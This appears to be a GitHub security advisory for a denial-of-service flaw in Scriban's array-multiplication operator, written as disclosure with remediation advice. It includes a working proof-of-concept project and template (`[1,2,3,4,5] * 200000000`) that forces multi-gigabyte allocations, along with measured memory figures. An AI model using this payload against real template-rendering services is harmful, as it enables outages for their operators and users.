# [M] Scriban: array * int (ScriptArray<T>.TryEvaluate) bypasses LoopLimit — incomplete fix for GHSA-c875-h985-hvrc, missed sibling of GHSA-24c8-4792-22hx

## Summary
Severity: Medium
Advisory: GHSA-q6rr-fm2g-g5x8
CWE: CWE-770
Ecosystem: NuGet
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-q6rr-fm2g-g5x8
Type: github-advisory

## Affected
- NuGet: `Scriban` — affected >=3.0.0 <7.2.1
- NuGet: `Scriban.Signed` — affected >=3.0.0 <7.2.1

## Details
### Summary

The array multiplication operator (`array * integer`) in Scriban allocates a result whose size is the product of the attacker-controlled integer and the array length, with **no `LoopLimit` / `LimitToString` check and no overflow-safe arithmetic**. A ~40-byte template forces a multi-gigabyte allocation, producing a denial-of-service.

This is the unguarded sibling of operations that *were* hardened against the same class of abuse: `string * integer` (gated by a `LimitToString` pre-check), `array.insert_at` (gated by `StepLoop`/`LoopLimit` — the **GHSA-24c8-4792-22hx** fix shipped in 7.2.0, scored 8.7 High), and the range/iteration paths covered by **GHSA-c875-h985-hvrc** ("Built-in operations bypass LoopLimit", fixed 7.0.0). The same `LoopLimit`-based hardening pattern was applied to those operations but never to `array * integer`.

This can be observed directly in 7.0.0, the release where GHSA-c875 was patched: `(1..5) * 50000000` (and `1..N | array.size`) correctly throws `Exceeding number of iteration limit '1000'`, while `[1,2,3,4,5] * 50000000` allocates ~2 GB with no limit. The `LoopLimit` control is enforced on the iteration path but not on the `array * int` allocation path, side by side, in the same version. The bug has been present since the operator was introduced in **3.0.0**, survives all of the 6.6.0 / 7.0.0 / 7.2.0 DoS-hardening passes, and is still present in 7.2.0 (current) — i.e. it is both a missed sibling of GHSA-24c8 and an incomplete coverage of GHSA-c875's `LoopLimit` hardening.

### Details

The `array * int` operator is handled in `ScriptArray<T>.TryEvaluate`:

```csharp
// src/Scriban/Runtime/ScriptArray.cs:504-508  (Multiply case)
var newArray = new ScriptArray<T>(intModifier * array.Count);
for (int i = 0; i < intModifier; i++)
{
    newArray.AddRange(array);
}
```

`intModifier` is the attacker-supplied integer (`context.ToInt(...)`, `ScriptArray.cs:399`). Two problems:

1. **No resource limit.** Neither `new ScriptArray<T>(intModifier * array.Count)` nor the `AddRange` loop consults `LoopLimit`, `LimitToString`, or calls `context.StepLoop(...)`. A grep of the entire `TryEvaluate` method (`ScriptArray.cs:360-560`) finds no `StepLoop` / `LoopLimit` / `Limit` reference. `LoopLimit` (default 1000) is therefore not enforced: a template that requests 250,000,000 elements creates them all without any "iteration limit" error.

2. **Integer overflow in the capacity.** `intModifier * array.Count` is unchecked `int` arithmetic. The overflow-safe `long` cast used by the string sibling is absent here.

The DoS-hardening passes guarded the two sibling operations but not this one:

```csharp
// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:341  (string * int — GUARDED)
if (context.LimitToString > 0 && value > 0 && leftText.Length > 0
        && (long)leftText.Length * value > context.LimitToString)   // long arithmetic, pre-check
{
    throw new ScriptRuntimeException(spanMultiplier, $"String multiplication exceeds LimitToString `{context.LimitToString}`.");
}
```

```csharp
// src/Scriban/Functions/ArrayFunctions.cs:414  (array.insert_at — GUARDED, GHSA-24c8 fix in 7.2.0)
for (int i = array.Count; i < index; i++)
{
    context.StepLoop(span, ref loopStep);   // LoopLimit enforced
    array.Add(null);
}
```

`array * int` (`ScriptArray.cs:504`) received neither guard.

When the oversized allocation fails as a managed exception, it is wrapped by the binary-expression evaluator:

```csharp
// src/Scriban/Syntax/Expressions/ScriptBinaryExpression.cs:241-243
catch (Exception ex) when (!(ex is ScriptRuntimeException))
{
    throw new ScriptRuntimeException(span, ex.Message);
}
```

So a host that wraps `Render()` in `try/catch` sees a `ScriptRuntimeException` carrying the original `OutOfMemoryException` message (or `ArgumentOutOfRangeException` on the integer-overflow path).

### PoC

A single console project reproduces it on the released NuGet package.

`poc.csproj`:
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <!-- If only the .NET 9 SDK is installed, change to net9.0. Behavior is identical. -->
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Scriban" Version="7.2.0" />
  </ItemGroup>
</Project>
```

`Program.cs`:
```csharp
using Scriban;

// ~41-byte template requests 5 * 200,000,000 = 1,000,000,000 elements
string tpl = "{{ x = [1,2,3,4,5] * 200000000; x.size }}";

System.Console.WriteLine("Rendering...");
var sw = System.Diagnostics.Stopwatch.StartNew();
var result = Template.Parse(tpl).Render();           // allocates ~7.7 GB
System.Console.WriteLine($"size={result.Trim()} peakWS="
    + System.Diagnostics.Process.GetCurrentProcess().PeakWorkingSet64 / (1024 * 1024)
    + "MB elapsed=" + sw.ElapsedMilliseconds + "ms");
```

Run:
```sh
dotnet run -c Release
```

Measured peak working set on Scriban 7.2.0 (net8.0, .NET 9 runtime, Linux), varying only the multiplier:

| Multiplier | template size | elements | peak working set |
|---|---|---|---|
| 100,000 | 38 B | 500K | 49 MB (not a DoS) |
| 50,000,000 | 40 B | 250M | 1,958 MB |
| 200,000,000 | 41 B | 1B | 7,681 MB |
| 400,000,000 | 41 B | 2B | 15,313 MB |
| 429,496,730 | 41 B | — | integer overflow in `intModifier * array.Count` → wrapped `ArgumentOutOfRangeException` |

`LoopLimit` (default 1000) is demonstrably not enforced: 250,000,000 elements are created with no "iteration limit" error. Reproduced identically on released NuGet **6.6.0, 7.0.0, 7.1.0, and 7.2.0**, and on **3.0.0, 4.0.0, 5.0.0, 5.10.0, 6.0.0, 6.2.1, 6.5.8** (~2 GB at multiplier 50,000,000). Version **2.1.4 and earlier are NOT affected** — the operator did not exist (`Unable to convert type ScriptArray to int`).

### Impact

- **Type:** Denial of service via uncontrolled memory allocation (CWE-789 / CWE-1284). The result size is `intModifier * array.Count`, attacker-controlled, with no limit and no overflow-safe arithmetic.
- **Severity:** CVSS 4.0 `AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` = **8.7 (High)** — the same vector and score GitHub/Scriban assigned to the sibling advisory GHSA-24c8-4792-22hx. CVSS 3.1 equivalent `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = **7.5 (High)**.
- **Who is impacted:** any application that renders a template whose text is wholly or partially attacker-controlled (the documented server-side template scenario), or that passes attacker-controlled strings to `object.eval` / `object.eval_template`. No `MemberFilter` interaction is required — this is a pure language operation.
- **Outcome (deployment-dependent, stated honestly):** On systems with sufficient memory, the runtime catches the allocation failure and the host sees a `ScriptRuntimeException` wrapping `OutOfMemoryException` (or `ArgumentOutOfRangeException` on the integer-overflow path) — recoverable per request. On systems where the multi-GB allocation exceeds available memory, the OS OOM-killer can terminate the process before the managed exception fires (this outcome is deployment-dependent and was not reproduced in our 20 GB + swap test environment). In all cases, a ~40-byte template forces a multi-GB allocation and seconds of pegged CPU/GC — a real per-request availability degradation and resource amplification.
- **Why the existing mitigation does not help:** `LoopLimit` (default 1000) is the documented control for unbounded iteration/allocation, but the `array * int` path never consults it, so a defender running default configuration is not protected.
- **Affected versions:** 3.0.0 – 7.2.0 (every release containing the `array * int` operator). 2.1.4 and earlier are not affected.

### Suggested remediation

Apply the same hardening already used on the sibling operations, in `ScriptArray.cs` (Multiply case, `:504-508`):

- **Mirror `array.insert_at`:** call `context.StepLoop(span, ref loopStep)` inside the fill loop so `LoopLimit` is enforced; or
- **Mirror `string * int`:** pre-check the result size with overflow-safe arithmetic before allocating, e.g. `if (context.LimitToString > 0 && (long)intModifier * array.Count > context.LimitToString) throw new ScriptRuntimeException(...)`, and compute the capacity as `long` (or reject negative/overflowing products) to remove the integer-overflow path.

Add a regression test that asserts a graceful `ScriptRuntimeException` for a large multiplier (e.g. `[1,2,3,4,5] * 50000000`) rather than allowing the allocation to proceed.

## References
- https://github.com/scriban/scriban/security/advisories/GHSA-q6rr-fm2g-g5x8
- https://github.com/scriban/scriban
